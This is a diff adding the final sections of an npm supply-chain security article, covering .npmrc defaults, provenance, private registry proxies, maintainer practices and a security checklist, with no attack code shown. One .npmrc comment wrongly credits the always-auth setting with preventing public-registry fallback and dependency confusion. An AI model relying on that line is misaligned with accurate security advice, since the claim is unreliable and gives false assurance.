+    <h3>Enable npm's Built-in Protections</h3>
+    <p>npm has a few underused security features that are worth turning on. <code>npm audit</code> should be part of every CI pipeline, but should not be treated as a complete solution since it only catches known vulnerabilities that have been reported. More useful is adding <code>ignore-scripts</code> to your <code>.npmrc</code> to prevent lifecycle scripts from running automatically, then auditing which packages you explicitly need to allow scripts for. The list is usually much shorter than you think.</p>
+
+    <div class="code-block">
+      <div class="code-label">.npmrc — tighter security defaults</div>
+      <pre><span class="code-cmt"># Prevent lifecycle scripts from running automatically</span>
+<span class="code-var">ignore-scripts</span>=<span class="code-str">true</span>
+
+<span class="code-cmt"># Require npm ci for CI installs (also set this in your pipeline)</span>
+<span class="code-cmt"># Use exact versions, not ranges</span>
+<span class="code-var">save-exact</span>=<span class="code-str">true</span>
+
+<span class="code-cmt"># Audit level — fail on high or critical</span>
+<span class="code-var">audit-level</span>=<span class="code-str">high</span>
+
+<span class="code-cmt"># Scope your private packages explicitly</span>
+<span class="code-var">@mycompany:registry</span>=<span class="code-str">https://private.registry.io</span>
+
+<span class="code-cmt"># Prevent public registry fallback for scoped packages</span>
+<span class="code-cmt"># (prevents dependency confusion)</span>
+<span class="code-var">@mycompany:always-auth</span>=<span class="code-str">true</span></pre>
+    </div>
+
+    <h3>Use Package Provenance Where Available</h3>
+    <p>If you are a package maintainer, enable provenance in your publishing workflow. It requires almost no extra effort if you are already publishing from GitHub Actions, and it gives your users a cryptographic guarantee that the package came from the source code and pipeline you say it did. If you are a package consumer, prefer packages that have provenance enabled for your most sensitive dependencies.</p>
+
+    <h3>Introduce a Private Mirror or Caching Proxy</h3>
+    <p>Running a private npm registry proxy like <strong>Verdaccio</strong> or using a commercial solution like <strong>Artifactory</strong> or <strong>AWS CodeArtifact</strong> gives you several advantages. You can allowlist specific packages and versions, you get a cache that protects against the npm registry being unavailable or packages being yanked, and you can enforce policy at the registry level rather than relying on each developer's configuration.</p>
+    <p>Critically, if you configure your private registry correctly and lock all scoped packages to your private registry, you close the dependency confusion attack vector entirely. Your <code>@mycompany</code> packages will only ever resolve from your registry, not from the public npm.</p>
+
+    <h3>Automated Dependency Review in Pull Requests</h3>
+    <p>GitHub's Dependency Review Action and similar tools from GitLab and others will automatically comment on pull requests that introduce vulnerable dependencies. This catches a large class of known-bad updates before they land in your main branch. It does not catch novel attacks, but it handles the boring, high-volume case of teams accidentally pulling in packages with known CVEs.</p>
+
+    <div class="callout">
+      <div class="callout-label">Honest Assessment of npm audit</div>
+      <p>npm audit is a good start, not a complete solution. It only flags packages with published CVEs. It has no visibility into malicious code that has not yet been reported. It cannot detect intent. A cryptominer that arrived via a compromised maintainer account will not show up in npm audit output until someone reports it and the advisory is published.</p>
+      <p>Use it, run it in CI, fix what it flags. But do not mistake silence from npm audit for safety. The interesting attacks are the ones the audit database does not know about yet.</p>
+    </div>
+  </section>
+
+  <!-- 08 -->
+  <section>
+    <div class="section-num">08 · For Maintainers</div>
+    <h2>If You Publish Packages: What You Are Responsible For</h2>
+    <p>Most of the conversation around supply chain security is written for consumers of packages, not publishers. But if you maintain anything on npm, even something small with a few hundred downloads a week, you are part of the supply chain. Other people's security posture depends partly on yours.</p>
+
+    <h3>Enable 2FA on Your npm Account. Today.</h3>
+    <p>This is the single highest-impact thing a maintainer can do and the one most frequently skipped. Account takeover via credential theft is the most common vector for supply chain attacks. If your npm account does not have 2FA enabled, your credentials being in a breach database is sufficient for an attacker to publish a malicious version of your package. npm now enforces 2FA for the top 500 most-downloaded packages, but that leaves millions of packages unprotected.</p>
+
+    <h3>Use Granular Access Tokens</h3>
+    <p>npm's granular access tokens, introduced in 2022, allow you to create tokens that are scoped to specific packages and specific actions. Your CI pipeline only needs a token that can publish; it does not need a token that can manage team membership or read all your private packages. Create publish-only tokens, set them to expire, and rotate them.</p>
+
+    <h3>Minimise Your postinstall Scripts</h3>
+    <p>If your package does not need a postinstall script, do not have one. If it does, make sure it is as minimal as possible and clearly documented. Postinstall scripts are the most scrutinised part of a package for security researchers, and having an unnecessary one raises red flags. If you need to compile native code, document why and be explicit about it.</p>
+
+    <h3>Audit Who Has Publish Access</h3>
+    <p>Over time, package collaborator lists accumulate people who have moved on, whose accounts may no longer be actively monitored, or who were added temporarily and never removed. Regularly review who has publish access to your packages and remove anyone who should not still have it. This is especially important for packages that were transferred or inherited.</p>
+
+    <div class="pull-quote">
+      <p>"Maintaining a popular open source package is a trust relationship. The people who install your code are betting their infrastructure on your security hygiene and your good judgement."</p>
+    </div>
+  </section>
+
+  <!-- 09 -->
+  <section>
+    <div class="section-num">09 · The Harder Problem</div>
+    <h2>What Technology Cannot Fix</h2>
+    <p>I want to be honest about the limits of the technical solutions. Most of what I have described above reduces your attack surface and raises the cost of an attack. It does not eliminate the fundamental problem, which is structural.</p>
+    <p>The npm ecosystem is built on a model of radical openness and decentralised trust. Anyone can publish anything. Packages can depend on anything. There is no formal review process, no credential verification for maintainers, and no mechanism to prevent a legitimate maintainer from deliberately introducing malicious code. These are not design oversights. They are intentional choices that enabled the ecosystem to grow as quickly as it did.</p>
+    <p>The tension is real. The thing that makes npm so productive, the ability to publish and consume code with essentially no friction, is the same thing that makes it a large attack surface. Stricter gatekeeping would slow legitimate publication and drive people to alternative channels. The current model is a tradeoff, not a mistake.</p>
+    <p>What this means in practice is that the human layer of trust matters as much as the technical layer. Being selective about which packages you adopt, paying attention to maintainer histories and community signals, and not reflexively adding a new dependency every time you need a utility function are all security practices, even if they do not show up in any security checklist.</p>
+
+    <h3>The Leftpad Lesson, Revisited</h3>
+    <p>When Azer Koculu unpublished the leftpad package from npm in 2016 and broke thousands of builds around the world, it prompted a lot of conversation about dependency minimalism. The lesson most people took was about npm's unpublish policy. The more interesting lesson was about how much of the ecosystem was depending on a package that added eleven lines of left-padding to a string.</p>
+    <p>Every dependency you do not add is one fewer entry point into your supply chain. The question "do I actually need this package?" has a security dimension that most teams do not factor in.</p>
+
+    <div class="stat-strip">
+      <div class="stat-item">
+        <div class="stat-num">11</div>
+        <div class="stat-label">Lines of Code<br/>in leftpad</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">2,500+</div>
+        <div class="stat-label">Projects Broken<br/>When It Was Yanked</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">0</div>
+        <div class="stat-label">Security Reviews<br/>Before Adoption</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">~40%</div>
+        <div class="stat-label">npm Packages With<br/>a Single Maintainer</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 10 -->
+  <section>
+    <div class="section-num">10 · Conclusions</div>
+    <h2>Where This Leaves You</h2>
+    <p>Supply chain security is not a problem you can fully solve. The best honest framing is: you can substantially reduce your risk, detect compromises faster, and limit the blast radius when something does go wrong. That is a worthwhile goal even if it is not a complete solution.</p>
+    <p>The practical starting points, roughly in order of impact, are these. Enable 2FA on your npm account if you are a maintainer. Switch to <code>npm ci</code> in all CI pipelines. Add <code>ignore-scripts=true</code> to your <code>.npmrc</code> and explicitly re-enable only the packages that genuinely need it. Introduce a private registry proxy with dependency allowlisting if you are running at any meaningful scale. And review your lockfile diffs the way you review your code diffs.</p>
+    <p>Beyond the technical measures: develop a habit of thinking about your dependency tree as a trust decision, not just a convenience decision. The package you add in five seconds to save writing twenty lines of code will run on every machine in your organisation, in every CI pipeline, in every customer-facing environment. That deserves at least a brief moment of consideration.</p>
+    <p>The ecosystem is getting better. Provenance is real and growing. npm's security team is more active than it was five years ago. The community's ability to detect and respond to attacks has improved significantly. But the fundamental dynamic, millions of developers trusting millions of packages maintained by people they have never met, is not going away. Learning to operate securely within that reality is a skill worth building.</p>
+
+    <div class="ornament">· · ·</div>
+
+    <div class="callout">
+      <div class="callout-label">Security Checklist</div>
+      <p><span class="tag green">Enabled</span> 2FA on all npm accounts with publish access</p>
+      <p><span class="tag green">Using</span> <code>npm ci</code> in all CI pipelines, not <code>npm install</code></p>
+      <p><span class="tag green">Reviewing</span> lockfile diffs in pull requests</p>
+      <p><span class="tag">Consider</span> <code>ignore-scripts=true</code> in <code>.npmrc</code> with explicit allowlist</p>
+      <p><span class="tag">Consider</span> Private registry proxy (Verdaccio, Artifactory, CodeArtifact)</p>
+      <p><span class="tag">Consider</span> Granular publish-only tokens with expiry for CI pipelines</p>
+      <p><span class="tag red">Overrated</span> <code>npm audit</code> as sole security measure (catches known CVEs only)</p>
+      <p><span class="tag red">Avoid</span> Unnecessary postinstall scripts in packages you publish</p>
+    </div>
+  </section>
+
+  <div class="footnote">
+    All package statistics and download figures referenced are approximate and based on publicly available npm registry data. The code examples are illustrative reconstructions based on publicly documented attack patterns. No malicious code is being distributed in this article.
+  </div>
+
+</div><!-- /content-wrap -->
+</body>
+</html>
